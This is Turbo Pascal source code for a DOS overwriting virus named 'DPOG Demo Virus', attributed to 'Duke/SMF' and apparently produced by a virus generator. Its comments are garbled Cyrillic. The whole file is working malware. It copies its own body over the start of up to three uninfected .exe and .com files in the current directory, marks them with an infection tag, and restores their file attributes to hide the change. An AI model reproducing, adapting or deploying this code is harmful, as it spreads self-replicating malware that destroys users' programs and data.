   uses dos;
   const VirusSize= 4576 { *ã¦®¥ ¢¯¨á âì! };
         Max=3;
   var Author,VirusName,Generator:string;
       ID1,ID2:byte;                        {¬¥âª  § à ¦¥®áâ¨}
       N:searchrec;
       Num:byte;                            {ç¨á«® ¯®à ¦¥ëå ä ©«®¢}
       VirusBody:array[1..VirusSize] of byte;
       Virus:file;
   {------------------}
   procedure Infect(i:string);              {‡ à ¦¥¨¥ ä ©«®¢}
   var g:file;
       attr:word;
   begin
   assign(g,i);
   GetFAttr(g,attr);                        {á®åà ¨«¨ ¯à¥¦¨¥  âà¨¡ãâë}
   SetFAttr(g,$20);                         {ãáâ ®¢ª   âà¨¡ãâ  Arhive}
   reset(g,1);                              {®âªàë«¨ ä ©«-¦¥àâ¢ã}
   blockwrite(g,VirusBody,VirusSize);       {§ ¯¨á «¨ ¯®¢¥àå ¢¨àãá}
   seek(g,$0A);
   blockwrite(g,ID1,1);                     {áâ ¢¨¬ ¬¥âªã § à ¦¥®áâ¨}
   blockwrite(g,ID2,1);
   close(g);                                {§ ªàë«¨ ä ©«-¦¥àâ¢ã}
   SetFAttr(g,attr);                        {ãáâ ®¢¨«¨ ¯à¥¦¨¥  âà¨¡ãâë}
   Num:=Num+1;
   end;
   {------------------}
   procedure Check(i:string);
   var g:file;
       y,z:byte;
   begin
   assign(g,i);
   reset(g,1);
   seek(g,$0A);
   blockread(g,y,1);
   blockread(g,z,1);
   close(g);
   if (y<>ord(ID1)) or (z<>ord(ID2)) then Infect(i);
   end;
   {------------------}
   procedure FindFileForKill;
   begin
   FindFirst('*.exe',$21,N);
   while doserror=0 do
     begin
     if Num=Max then Exit else  Check(N.name);
     FindNext(N)
     end;
   FindFirst('*.com',$21,N);
   while doserror=0 do
     begin
     if Num=Max then Exit else  Check(N.name);
     FindNext(N)
     end;
   end;
   {------------------}
   begin
   Author:='Duke/SMF';
   VirusName:='DPOG Demo Virus';
   Generator:='[DPOG v0.01]';
   ID1:=77;
   ID2:=36;
   Num:=0;
   assign(Virus,paramstr(0));reset(Virus,1);
   blockread(Virus,VirusBody,VirusSize);
   close(Virus);
   FindFileForKill;
   writeln('This is DPOG demo virus');
   writeln('Created (c) by Duke/SMF');
   end.
